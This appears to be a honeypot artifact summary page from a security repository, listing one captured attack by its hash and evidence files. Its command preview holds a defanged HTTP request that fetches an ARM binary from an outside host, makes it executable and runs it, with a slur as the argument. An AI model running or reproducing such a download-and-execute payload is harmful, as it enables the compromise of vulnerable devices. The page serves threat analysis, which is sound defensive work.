# 1993de3c5053515d7469ade3b5aa0b5e10985424cb6249e21f6ccb6e3f3db83f

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `1993de3c5053515d7469ade3b5aa0b5e10985424cb6249e21f6ccb6e3f3db83f` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /shell?cd+/tmp;rm+nerv.arm7;wget+http:/\/hxxp://93[.]115[.]101[.]XXX:13734/nerv.arm7;chmod+777+nerv.arm7;./nerv.arm7+jews;
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
